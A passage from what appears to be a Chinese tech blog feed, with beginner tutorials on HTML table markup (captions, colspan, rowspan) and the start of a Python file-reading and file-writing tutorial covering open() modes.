class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">003</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>小白<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>程序员<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2019/03/09/5c836d74b4ebb.png" alt="8.png" data-zoomable></p></div><br><br><ol start="2"><li><code>&lt;caption&gt;&lt;/caption&gt;</code>表格标题示例：</li></ol><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>     <span class="token operator">&lt;</span>table border<span class="token operator">=</span><span class="token string">"2"</span> width<span class="token operator">=</span><span class="token string">"300"</span> height<span class="token operator">=</span><span class="token string">"100"</span> bordercolor<span class="token operator">=</span><span class="token string">"blue"</span> bgColor<span class="token operator">=</span><span class="token string">"#88cc66"</span>             cellspacing<span class="token operator">=</span><span class="token string">"0"</span> cellpadding<span class="token operator">=</span><span class="token string">"2"</span> rules<span class="token operator">=</span><span class="token string">"all"</span><span class="token operator">></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>caption</span><span class="token punctuation">></span></span></span><span class="token number">2019.3</span>月日历<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>caption</span><span class="token punctuation">></span></span></span>   <span class="token markup">&lt;!--放在<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>中间<span class="token operator">--</span><span class="token operator">></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>工号<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>姓名<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>职位<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">001</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>小明<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>设计师<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">002</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>小方<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>工程师<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">003</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>小白<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>             <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>程序员<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2019/03/09/5c836e941fa2e.png" alt="10.png" data-zoomable></p></div><br><br><ol start="3"><li>空表格、跨行或者跨列表格示例：</li></ol><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--建立空表，无属性--></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>zdd<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">30</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>ddz<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">27</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--合并左右单元格--></span></span>     <span class="token operator">&lt;</span>table border<span class="token operator">=</span><span class="token string">"2"</span> width<span class="token operator">=</span><span class="token string">"400"</span> height<span class="token operator">=</span><span class="token string">"100"</span> bordercolor<span class="token operator">=</span><span class="token string">"blue"</span> bgColor<span class="token operator">=</span><span class="token string">"#88cc66"</span>             cellspacing<span class="token operator">=</span><span class="token string">"0"</span> cellpadding<span class="token operator">=</span><span class="token string">"2"</span> rules<span class="token operator">=</span><span class="token string">"all"</span><span class="token operator">></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>姓名<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">colspan</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>电话<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>Bill Gates<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">555</span> <span class="token number">77</span> <span class="token number">854</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">555</span> <span class="token number">77</span> <span class="token number">855</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--合并上下单元格--></span></span>   <span class="token operator">&lt;</span>table border<span class="token operator">=</span><span class="token string">"2"</span> width<span class="token operator">=</span><span class="token string">"400"</span> height<span class="token operator">=</span><span class="token string">"100"</span> bordercolor<span class="token operator">=</span><span class="token string">"blue"</span> bgColor<span class="token operator">=</span><span class="token string">"#88cc66"</span>           cellspacing<span class="token operator">=</span><span class="token string">"0"</span> cellpadding<span class="token operator">=</span><span class="token string">"2"</span> rules<span class="token operator">=</span><span class="token string">"all"</span><span class="token operator">></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>姓名<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>Bill Gates<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span> <span class="token attr-name">rowspan</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>电话<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">555</span> <span class="token number">77</span> <span class="token number">854</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token number">555</span> <span class="token number">77</span> <span class="token number">855</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2019/03/09/5c83737340e28.png" alt="11.png" data-zoomable></p></div><br><br><h3 id="五-HTML-表单"><font color="#FF6347" face="Comic sans MS">五. HTML 表单</font><a href="post/HTML-basics#五-HTML-表单"></a></h3><br><p>表单很简单，在HTML里它就是用来人与服务器的交互，或者说是HTML的输入输出交互的重要功能！</p><p>表单后续有时间再详细叙述吧，或者可以看在本站博文就有开始使用了….<font color="#00B2EE">《<a href="https://directoree.top/post/PHP-MySQL" target="_blank" rel="noopener">PHP操作MySQL数据库</a>》</font></p><br><br><h3 id="六-CSS"><font color="#FF6347" face="Comic sans MS">六. CSS</font><a href="post/HTML-basics#六-CSS"></a></h3><p><font color="#00B2EE">《<a href="https://directoree.github.io/post/HTML-CSS">CSS 基础</a>》</font></p><p>本文参考：<br><font color="#00B2EE">《<a href="http://www.php.cn/code/570.html" target="_blank" rel="noopener">html/css快速入门</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/665.html" target="_blank" rel="noopener">HTML+CSS基础入门教程</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/24737.html" target="_blank" rel="noopener">HTML极速入门(2018版)</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/5007.html" target="_blank" rel="noopener">弹指间学会HTML视频教程</a>》</font></p>]]></content>
      
      
      <categories>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-文件系统</title>
      <link href="/post/Python-FileContents/"/>
      <url>/post/Python-FileContents/</url>
      
        <content type="html"><![CDATA[<p>Python是 文件对象.write()，PHP是fwrite() 😀…</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">文件系统</font> </center><p>推荐参考资料：<br><font color="#00B2EE">《<a href="http://www.runoob.com/python3/python3-inputoutput.html" target="_blank" rel="noopener">Python3 输入和输出</a>》</font><br><font color="#00B2EE">《<a href="https://www.cnblogs.com/sjie0224/articles/7562509.html" target="_blank" rel="noopener">Python学习之路-11 (文件操作)</a>》</font> </p><br><br><h3 id="一-读写文件"><font color="#FF6347" face="Comic sans MS">一. 读写文件</font><a href="post/Python-FileContents#一-读写文件"></a></h3><p>Python提供了 input() 内置函数从标准输入读入一行文本，并将输入以字符串形式返回，默认的标准输入是键盘。</p><p>input 可以接收一个Python表达式作为输入，并将运算结果返回。</p><pre class="line-numbers language-python"><code class="language-python">str <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入："</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"你输入的内容是: "</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span>这会产生如下的对应着输入的结果：请输入：菜鸟教程你输入的内容是<span class="token punctuation">:</span>  菜鸟教程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><p><font color="#00B2EE"><strong>使用到的方法：</strong></font></p><ul><li><font color="#FF7F00"><strong>open()：</strong></font> 以某种读写模式打开一个文件，将会返回一个 file 对象；</li><li><font color="#FF7F00"><strong>f.write(string) ：</strong></font> 将 string 写入到文件中, 然后返回写入的字符数；</li><li><font color="#FF7F00"><strong>f.read(size)：</strong></font> 将读取一定数目的数据, 然后作为字符串或字节对象返回；</li><li><font color="#FF7F00"><strong>f.readline() ：</strong></font> 从文件读取整行，包括 “\n” 字符。如果指定了一个非负数的参数，则返回指定大小的字节数，包括 “\n” 字符。；</li><li><font color="#FF7F00"><strong>f.readlines() ：</strong></font> 将返回该文件中包含的所有行；</li><li><font color="#FF7F00"><strong>f.tell() ：</strong></font> 返回文件对象当前所处的位置, 它是从文件开头开始算起的<strong>字节数</strong>；</li><li><font color="#FF7F00"><strong>f.seek() ：</strong></font> 如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数；</li><li><font color="#FF7F00"><strong>f.close() ：</strong></font> 当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，如果尝试再调用该文件，则会抛出异常。</li></ul></blockquote><br><br><h4 id="1-1-open"><font color="#3CB371" face="Comic sans MS">1.1 open()</font><a href="post/Python-FileContents#1-1-open"></a></h4><p>Python open() 方法用于打开一个文件，并<font color="#FF7F00"><strong>返回文件对象</strong></font>，在对文件进行处理过程都需要使用到这个函数，如果该文件无法被打开，会抛出 OSError。</p><p><strong>注意：</strong>使用 open() 方法一定要保证关闭文件对象，即调用 close() 方法。</p><p>open() 函数常用形式是接收两个参数：<strong>文件名(file)和模式(mode)</strong>。即<strong><code>a = open(file, mode);</code></strong></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">语法格式</th><th align="left">参数说明</th><th align="left">返回类型</th></tr></thead><tbody><tr><td align="left">open(file, mode, buffering, encoding=None, <br>&emsp;&emsp;&emsp;errors=None, newline=None, <br>&emsp;&emsp;&emsp;closefd=True, opener=None)</td><td align="left">file: 必需，文件路径（相对或者绝对路径）。<br>mode: 可选，文件打开模式<br>buffering: 设置缓冲<br>encoding: 一般使用utf8<br>errors: 报错级别<br>newline: 区分换行符<br>closefd: 传入的file参数类型<br>opener:</td><td align="left">文件对象</td></tr></tbody></table></div></div><br><p><font color="#FF7F00"><strong>mode 参数有：</strong></font></p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">t</td><td align="left">文本模式 (默认)。</td></tr><tr><td align="left">x</td><td align="left">写模式，新建一个文件，如果该文件已存在则会报错。</td></tr><tr><td align="left">b</td><td align="left">二进制模式。</td></tr><tr><td align="left">+</td><td align="left">打开一个文件进行<strong>更新(可读可写)</strong>。</td></tr><tr><td align="left">U</td><td align="left">通用换行模式（不推荐）。</td></tr><tr><td align="left">r</td><td align="left">以<strong>只读方式</strong>打开文件。文件的指针将会放在<strong>文件的开头</strong>。这是默认模式。</td></tr><tr><td align="left">rb</td><td align="left">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。<br>一般用于非文本文件如图片等。</td></tr><tr><td align="left">r+</td><td align="left">打开一个文件<strong>用于读写</strong>。文件指针将会放在文件的<strong>开头</strong>。</td></tr><tr><td align="left">rb+</td><td align="left">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td></tr><tr><td align="left">w</td><td align="left">打开一个文件<strong>只用于写入</strong>。如果该文件已存在则打开文件，并从开头开始编辑，即<strong>原有内容会被删除</strong>。<br>如果该文件不存在，创建新文件。</td></tr><tr><td align="left">wb</td><td align="left">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有<br>内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="left">w+</td><td align="left">打开一个文件用于<strong>读写</strong>。如果该文件已存在则打开文件，并<strong>从开头开始编辑</strong>，<strong>即原有内容会被删除</strong>。<br>如果该文件不存在，创建新文件。</td></tr><tr><td align="left">wb+</td><td align="left">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，<br>即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="left">a</td><td align="left">打开一个文件用于<strong>追加(不能读)</strong>。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，<br>新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="left">ab</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，<br>新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="left">a+</td><td align="left">打开一个文件用于<strong>读写</strong>。如果该文件已存在，文件<strong>指针将会放在文件的结尾</strong>。<br>文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td></tr><tr><td align="left">ab+</td><td align="left">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。<br>如果该文件不存在，创建新文件用于读写。</td></tr></tbody></table></div></div><br><p>下图很好的总结了这几种模式：</p><div class="article-img"><p><img src="https://i.loli.net/2019/03/06/5c7fb64577036.png" alt="2.png" data-zoomable></p></div><br><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="center">模式</th><th align="center">读</th><th align="center">写</th><th align="center">创建</th><th align="center">覆盖</th><th align="center">指针在开始</th><th align="center">指针在结尾</th></tr></thead><tbody><tr><td align="center"><strong>r</strong></td><td align="center"><strong>✔</strong></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"><strong>✔</strong></td><td align="center"></td></tr><tr><td align="center"><strong>r+</strong></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"></td><td align="center"></td><td align="center"><strong>✔</strong></td><td align="center"></td></tr><tr><td align="center"><strong>w</strong></td><td align="center"></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"></td></tr><tr><td align="center"><strong>w+</strong></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"></td></tr><tr><td align="center"><strong>a</strong></td><td align="center"></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"></td><td align="center"></td><td align="center"><strong>✔</strong></td></tr><tr><td align="center"><strong>a+</strong></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"><strong>✔</strong></td><td align="center"></td><td align="center"></td><td align="center"><strong>✔</strong></td></tr></tbody></table></div></div><p><font color="#FF7F00"><strong>总结：</strong></font></p><ol><li>w 和 a 都是<font color="#FF7F00"><strong>写入不能读内容</strong></font>，前者是覆盖，后者是追加内容。</li><li>w+ 和 a+ 都是<font color="#FF7F00"><strong>写入且能读内容</strong></font>，前者是覆盖，后者是追加内容。</li></ol><br><p>以下实例将字符串写入到文件 foo.txt 中：</p><p><font color="#FF7F00"></font></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 打开一个文件</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"g:/PythonSt/foo.txt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"Python 是一个非常好的语言。\n是的，的确非常好!!\n"</span> <span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"文件打开失败"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭打开的文件</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>此时打开文件 foo<span class="token punctuation">.</span>txt<span class="token punctuation">,</span>显示如下：Python 